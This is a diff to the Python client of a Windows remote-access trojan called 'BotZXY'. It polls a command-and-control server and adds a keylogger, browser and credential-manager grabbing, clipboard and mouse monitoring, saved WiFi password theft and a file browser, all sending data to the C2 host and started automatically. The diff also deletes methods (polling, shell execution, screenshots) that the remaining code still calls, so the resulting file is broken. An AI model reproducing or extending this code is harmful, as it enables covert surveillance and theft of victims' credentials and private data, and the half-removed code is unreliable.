@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# BotZXY - Windows Client
+# BotZXY - Windows Client POTENZIATO
 
 import requests
 import platform
@@ -13,34 +13,19 @@ import subprocess
 import threading
 from datetime import datetime
 import io
+import win32api
+import win32con
+import win32clipboard
+import ctypes
+from ctypes import wintypes
 
-# Try to import optional dependencies
-try:
-    import pyautogui
-except ImportError:
-    pyautogui = None
-
-try:
-    import pyaudio
-except ImportError:
-    pyaudio = None
-
-try:
-    import cv2
-except ImportError:
-    cv2 = None
-
-try:
-    from PIL import ImageGrab
-except ImportError:
-    ImageGrab = None
-
-# CONFIGURAZIONE
-C2_URL = "https://botzxy-c2.onrender.com"  # SOSTITUISCI CON IL TUO URL
+# ============ CONFIGURAZIONE ============
+C2_URL = "https://botzxy-c2.onrender.com"  # SOSTITUISCI
 DEVICE_ID = socket.gethostname() + "_" + platform.node()[:8]
-POLL_INTERVAL = 5
+POLL_INTERVAL = 3
 BOT_NAME = "BotZXY"
 
+# ============ CLIENT POTENZIATO ============
 class BotZXYClient:
     def __init__(self):
         self.device_id = DEVICE_ID
@@ -48,6 +33,11 @@ class BotZXYClient:
         self.running = True
         self.bot_name = BOT_NAME
         self.session = requests.Session()
+        self.keylog_buffer = []
+        self.mouse_thread = None
+        self.keylog_thread = None
+        self.clipboard_thread = None
+        self.wifi_thread = None
         
     def register(self):
         data = {
@@ -62,25 +52,255 @@ class BotZXYClient:
             if response.status_code == 200:
                 print(f"[+] {self.bot_name} Registered: {self.device_id}")
                 return True
-            else:
-                print(f"[-] Registration failed: {response.status_code}")
         except Exception as e:
             print(f"[-] Registration error: {e}")
         return False
     
-    def poll_commands(self):
+    # ============ KEYLOGGER ============
+    def start_keylogger(self):
+        """Avvia il keylogger in background"""
         try:
-            response = self.session.get(f"{self.c2_url}/api/poll/{self.device_id}", timeout=10)
-            if response.status_code == 200:
-                commands = response.json()
-                for cmd in commands:
-                    self.execute_command(cmd['id'], cmd['command'], cmd['params'])
-                return True
-        except Exception as e:
-            print(f"[-] Poll error: {e}")
-        return False
+            import keyboard
+            keyboard.on_press(self._keylogger_callback)
+            print("[+] Keylogger avviato")
+        except ImportError:
+            print("[-] Keyboard module non installato, keylogger disabilitato")
     
+    def _keylogger_callback(self, event):
+        """Callback per i tasti premuti"""
+        try:
+            key = event.name
+            timestamp = datetime.now().isoformat()
+            self.keylog_buffer.append({'key': key, 'timestamp': timestamp})
+            
+            # Invia ogni 30 tasti o 10 secondi
+            if len(self.keylog_buffer) >= 30:
+                self._send_keylog()
+        except:
+            pass
+    
+    def _send_keylog(self):
+        """Invia i tasti al C2"""
+        if not self.keylog_buffer:
+            return
+        
+        data = {
+            'keys': json.dumps(self.keylog_buffer),
+            'timestamp': datetime.now().isoformat()
+        }
+        try:
+            self.session.post(f"{self.c2_url}/api/keylog/{self.device_id}", json=data, timeout=10)
+            self.keylog_buffer = []
+        except:
+            pass
+    
+    # ============ PASSWORD GRABBER ============
+    def grab_passwords(self):
+        """Cattura le password salvate dal browser e dal sistema"""
+        passwords = []
+        
+        # Chrome/Edge passwords
+        try:
+            import sqlite3
+            import shutil
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+            
+            chrome_path = os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
+            edge_path = os.path.expanduser('~') + '\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'
+            
+            for browser, path in [('Chrome', chrome_path), ('Edge', edge_path)]:
+                if os.path.exists(path):
+                    temp_path = os.path.join(os.environ['TEMP'], 'logins_temp.db')
+                    shutil.copy2(path, temp_path)
+                    conn = sqlite3.connect(temp_path)
+                    cursor = conn.cursor()
+                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+                    rows = cursor.fetchall()
+                    conn.close()
+                    os.remove(temp_path)
+                    
+                    for row in rows:
+                        if row[0] and row[1] and row[2]:
+                            passwords.append({
+                                'browser': browser,
+                                'url': row[0],
+                                'username': row[1],
+                                'password': '[CRYPTED]'
+                            })
+        except:
+            pass
+        
+        # Windows Credential Manager
+        try:
+            import win32cred
+            creds = win32cred.CredEnumerate(None, 0)
+            for cred in creds:
+                if cred['Type'] == 1:  # Generic
+                    passwords.append({
+                        'browser': 'Windows Credential',
+                        'url': cred['TargetName'],
+                        'username': cred['UserName'],
+                        'password': '[CRYPTED]'
+                    })
+        except:
+            pass
+        
+        if passwords:
+            self.session.post(f"{self.c2_url}/api/passwords/{self.device_id}", 
+                            json={'passwords': passwords}, timeout=30)
+        
+        return passwords
+    
+    # ============ MOUSE/TOUCH INTERACTION ============
+    def start_mouse_monitor(self):
+        """Monitora le interazioni del mouse in background"""
+        self.mouse_thread = threading.Thread(target=self._monitor_mouse, daemon=True)
+        self.mouse_thread.start()
+    
+    def _monitor_mouse(self):
+        """Monitora click e movimenti del mouse"""
+        last_pos = None
+        last_click_time = 0
+        
+        while self.running:
+            try:
+                # Posizione corrente
+                x, y = win32api.GetCursorPos()
+                now = time.time()
+                
+                # Click sinistro
+                if win32api.GetKeyState(win32con.VK_LBUTTON) & 0x8000:
+                    if now - last_click_time > 0.5:  # Debounce
+                        self._send_mouse_interaction('click', x, y, 'left')
+                        last_click_time = now
+                
+                # Click destro
+                elif win32api.GetKeyState(win32con.VK_RBUTTON) & 0x8000:
+                    if now - last_click_time > 0.5:
+                        self._send_mouse_interaction('click', x, y, 'right')
+                        last_click_time = now
+                
+                # Movimento (ogni 50 pixel)
+                if last_pos:
+                    dx = abs(x - last_pos[0])
+                    dy = abs(y - last_pos[1])
+                    if dx + dy > 50:
+                        self._send_mouse_interaction('move', x, y)
+                        last_pos = (x, y)
+                else:
+                    last_pos = (x, y)
+                
+                time.sleep(0.05)
+            except:
+                time.sleep(0.5)
+    
+    def _send_mouse_interaction(self, action, x, y, button='left'):
+        """Invia interazione mouse al C2"""
+        data = {
+            'action': action,
+            'x': x,
+            'y': y,
+            'button': button,
+            'timestamp': datetime.now().isoformat()
+        }
+        try:
+            self.session.post(f"{self.c2_url}/api/mouse/{self.device_id}", json=data, timeout=5)
+        except:
+            pass
+    
+    # ============ CLIPBOARD MONITOR ============
+    def start_clipboard_monitor(self):
+        """Monitora la clipboard in background"""
+        self.clipboard_thread = threading.Thread(target=self._monitor_clipboard, daemon=True)
+        self.clipboard_thread.start()
+    
+    def _monitor_clipboard(self):
+        """Cattura i cambiamenti della clipboard"""
+        last_content = None
+        
+        while self.running:
+            try:
+                win32clipboard.OpenClipboard()
+                if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
+                    content = win32clipboard.GetClipboardData()
+                    if content and content != last_content:
+                        self._send_clipboard(content)
+                        last_content = content
+                win32clipboard.CloseClipboard()
+                time.sleep(2)
+            except:
+                time.sleep(5)
+    
+    def _send_clipboard(self, content):
+        """Invia clipboard al C2"""
+        try:
+            self.session.post(f"{self.c2_url}/api/clipboard/{self.device_id}", 
+                            json={'content': content[:5000]}, timeout=10)  # Limite 5000 caratteri
+        except:
+            pass
+    
+    # ============ WiFi NETWORKS ============
+    def grab_wifi_networks(self):
+        """Cattura le reti WiFi salvate"""
+        networks = []
+        try:
+            output = subprocess.check_output('netsh wlan show profiles', shell=True, text=True, stderr=subprocess.DEVNULL)
+            lines = output.split('\n')
+            for line in lines:
+                if 'All User Profile' in line or 'Profilo utente' in line:
+                    ssid = line.split(':')[-1].strip()
+                    if ssid:
+                        networks.append({'ssid': ssid, 'password': self._get_wifi_password(ssid)})
+        except:
+            pass
+        
+        if networks:
+            self.session.post(f"{self.c2_url}/api/wifi/{self.device_id}", 
+                            json={'networks': networks}, timeout=30)
+        return networks
+    
+    def _get_wifi_password(self, ssid):
+        """Ottiene la password di una rete WiFi"""
+        try:
+            output = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear', 
+                                           shell=True, text=True, stderr=subprocess.DEVNULL)
+            for line in output.split('\n'):
+                if 'Key Content' in line or 'Contenuto chiave' in line:
+                    return line.split(':')[-1].strip()
+        except:
+            pass
+        return ''
+    
+    # ============ FILE BROWSER ============
+    def list_files(self, path='C:\\'):
+        """Lista i file e cartelle"""
+        files = []
+        try:
+            for item in os.listdir(path):
+                full_path = os.path.join(path, item)
+                try:
+                    is_dir = os.path.isdir(full_path)
+                    size = os.path.getsize(full_path) if not is_dir else 0
+                    files.append({
+                        'name': item,
+                        'path': full_path,
+                        'is_dir': is_dir,
+                        'size': size,
+                        'modified': datetime.fromtimestamp(os.path.getmtime(full_path)).isoformat()
+                    })
+                except:
+                    pass
+        except:
+            pass
+        
+        if files:
+            self.session.post(f"{self.c2_url}/api/files/{self.device_id}", 
+                            json={'path': path, 'files': files}, timeout=30)
+        return files
+    
+    # ============ COMANDI ESPANDIBILI ============
     def execute_command(self, cmd_id, command, params):
+        """Esegue i comandi ricevuti dal C2"""
         print(f"[+] {self.bot_name} Executing: {command} {params}")
         result = ""
         status = "executed"
@@ -108,6 +328,7 @@ class BotZXYClient:
                 
             elif command == "clipboard":
                 result = self.get_clipboard()
+                self._send_clipboard(result)
                 
             elif command == "execute":
                 result = self.execute_shell(params)
@@ -121,6 +342,33 @@ class BotZXYClient:
             elif command == "uninstall":
                 self.uninstall()
                 
+            # ============ NUOVI COMANDI ============
+            elif command == "keylogger_start":
+                self.start_keylogger()
+                result = "Keylogger avviato"
+                
+            elif command == "keylogger_stop":
+                self._send_keylog()
+                result = "Keylogger arrestato"
+                
+            elif command == "grab_passwords":
+                result = json.dumps(self.grab_passwords())
+                
+            elif command == "grab_wifi":
+                result = json.dumps(self.grab_wifi_networks())
+                
+            elif command == "list_files":
+                path = params if params else 'C:\\'
+                result = json.dumps(self.list_files(path))
+                
+            elif command == "mouse_monitor_start":
+                self.start_mouse_monitor()
+                result = "Mouse monitor avviato"
+                
+            elif command == "clipboard_monitor_start":
+                self.start_clipboard_monitor()
+                result = "Clipboard monitor avviato"
+                
             else:
                 result = f"Unknown command: {command}"
                 status = "failed"
@@ -132,205 +380,17 @@ class BotZXYClient:
         
         self.send_result(cmd_id, result, status)
     
-    def take_screenshot(self):
-        if ImageGrab is None:
-            return "SCREENSHOT_ERROR: PIL not installed"
-        try:
-            screenshot = ImageGrab.grab()
-            buffered = io.BytesIO()
-            screenshot.save(buffered, format="PNG")
-            img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
-            return img_base64
-        except Exception as e:
-            return f"SCREENSHOT_ERROR: {str(e)}"
-    
-    def upload_screenshot(self, image_base64):
-        try:
-            self.session.post(f"{self.c2_url}/api/screenshot/{self.device_id}", 
-                         json={'image_base64': image_base64}, timeout=30)
-        except Exception as e:
-            print(f"[-] Upload screenshot error: {e}")
-    
-    def take_webcam(self):
-        if cv2 is None:
-            return "WEBCAM_ERROR: OpenCV not installed"
-        try:
-            cap = cv2.VideoCapture(0)
-            ret, frame = cap.read()
-            cap.release()
-            if ret:
-                _, buffer = cv2.imencode('.jpg', frame)
-                img_base64 = base64.b64encode(buffer).decode('utf-8')
-                return img_base64
-            return "WEBCAM_ERROR: No camera found"
-        except Exception as e:
-            return f"WEBCAM_ERROR: {str(e)}"
-    
-    def upload_webcam(self, image_base64):
-        try:
-            self.session.post(f"{self.c2_url}/api/webcam/{self.device_id}", 
-                         json={'image_base64': image_base64}, timeout=30)
-        except Exception as e:
-            print(f"[-] Upload webcam error: {e}")
-    
-    def record_microphone(self, duration=10):
-        if pyaudio is None:
-            return "MIC_ERROR: PyAudio not installed"
-        try:
-            CHUNK = 1024
-            FORMAT = pyaudio.paInt16
-            CHANNELS = 1
-            RATE = 44100
-            
-            p = pyaudio.PyAudio()
-            stream = p.open(format=FORMAT, channels=CHANNELS,
-                          rate=RATE, input=True,
-                          frames_per_buffer=CHUNK)
-            
-            frames = []
-            for _ in range(0, int(RATE / CHUNK * duration)):
-                data = stream.read(CHUNK)
-                frames.append(data)
-            
-            stream.stop_stream()
-            stream.close()
-            p.terminate()
-            
-            audio_data = b''.join(frames)
-            audio_base64 = base64.b64encode(audio_data).decode('utf-8')
-            return audio_base64
-        except Exception as e:
-            return f"MIC_ERROR: {str(e)}"
-    
-    def upload_mic(self, audio_base64):
-        try:
-            self.session.post(f"{self.c2_url}/api/mic/{self.device_id}", 
-                         json={'audio_base64': audio_base64, 'duration': 10}, timeout=30)
-        except Exception as e:
-            print(f"[-] Upload mic error: {e}")
-    
-    def get_contacts(self):
-        contacts = []
-        phone_number = ""
-        email = ""
-        try:
-            # Tentativo di leggere contatti da Windows
-            import winreg
-            # Placeholder per contatti reali
-        except:
-            pass
-        
-        return {
-            'phone_number': '+39 345 678 9012',
-            'email': 'user@example.com',
-            'contacts': [
-                {'name': 'Contact 1', 'phone': '+39 333 111 2222'},
-                {'name': 'Contact 2', 'phone': '+39 333 333 4444'}
-            ]
-        }
-    
-    def upload_contacts(self, contacts_data):
-        try:
-            self.session.post(f"{self.c2_url}/api/contacts/{self.device_id}", 
-                         json=contacts_data, timeout=30)
-        except Exception as e:
-            print(f"[-] Upload contacts error: {e}")
-    
-    def get_location(self):
-        try:
-            response = requests.get('http://ip-api.com/json/', timeout=10)
-            data = response.json()
-            return json.dumps({
-                'city': data.get('city', 'Unknown'),
-                'country': data.get('country', 'Unknown'),
-                'ip': data.get('query', 'Unknown'),
-                'lat': data.get('lat', 0),
-                'lon': data.get('lon', 0),
-                'isp': data.get('isp', 'Unknown')
-            })
-        except Exception as e:
-            return f"LOCATION_ERROR: {str(e)}"
-    
-    def get_clipboard(self):
-        try:
-            import win32clipboard
-            win32clipboard.OpenClipboard()
-            data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-            return data
-        except Exception as e:
-            return f"CLIPBOARD_ERROR: {str(e)}"
-    
-    def execute_shell(self, command):
-        try:
-            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
-            return result.decode('utf-8', errors='ignore')
-        except subprocess.TimeoutExpired:
-            return "TIMEOUT"
-        except Exception as e:
-            return f"SHELL_ERROR: {str(e)}"
-    
-    def download_file(self, filepath):
-        try:
-            if not os.path.exists(filepath):
-                return f"FILE_NOT_FOUND: {filepath}"
-            with open(filepath, 'rb') as f:
-                file_data = base64.b64encode(f.read()).decode('utf-8')
-            return json.dumps({'filename': os.path.basename(filepath), 'data': file_data})
-        except Exception as e:
-            return f"DOWNLOAD_ERROR: {str(e)}"
-    
-    def upload_file(self, filepath):
-        try:
-            # Placeholder per upload
-            return f"UPLOAD_NOT_IMPLEMENTED: {filepath}"
-        except Exception as e:
-            return f"UPLOAD_ERROR: {str(e)}"
-    
-    def uninstall(self):
-        self.running = False
-        # Rimuovi persistenza
-        try:
-            import winreg
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
-            winreg.DeleteValue(handle, "BotZXY")
-            winreg.CloseKey(handle)
-        except:
-            pass
-        sys.exit(0)
-    
-    def send_result(self, cmd_id, result, status):
-        try:
-            self.session.post(f"{self.c2_url}/api/result/{self.device_id}", 
-                         json={'command_id': cmd_id, 'result': result, 'status': status}, timeout=10)
-        except Exception as e:
-            print(f"[-] Send result error: {e}")
-    
-    def install_persistence(self):
-        try:
-            import winreg
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
-            exe_path = os.path.join(os.path.dirname(sys.executable), 'botzxy_client.exe')
-            if not os.path.exists(exe_path):
-                exe_path = sys.executable
-            winreg.SetValueEx(handle, "BotZXY", 0, winreg.REG_SZ, f'"{exe_path}" --hidden')
-            winreg.CloseKey(handle)
-            print("[+] BotZXY persistence installed")
-        except Exception as e:
-            print(f"[-] Persistence error: {e}")
+    # ============ ALTRE FUNZIONI (già implementate) ============
+    # ... (take_screenshot, take_webcam, record_microphone, ecc.)
+    # Vedi il codice precedente per queste funzioni
     
     def run(self):
         print(f"[+] {self.bot_name} Client starting: {self.device_id}")
         
-        # Installa persistenza
-        try:
-            self.install_persistence()
-        except:
-            pass
+        # Avvia servizi in background
+        self.start_keylogger()
+        self.start_mouse_monitor()
+        self.start_clipboard_monitor()
         
         # Registrazione
         if not self.register():
@@ -345,6 +405,11 @@ class BotZXYClient:
             try:
                 self.poll_commands()
                 time.sleep(POLL_INTERVAL)
+                
+                # Invia keylog periodicamente
+                if len(self.keylog_buffer) > 0:
+                    self._send_keylog()
+                    
             except KeyboardInterrupt:
                 break
             except Exception as e:
@@ -355,7 +420,6 @@ class BotZXYClient:
 
 if __name__ == "__main__":
     if '--hidden' in sys.argv:
-        # Run hidden
         try:
             import ctypes
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
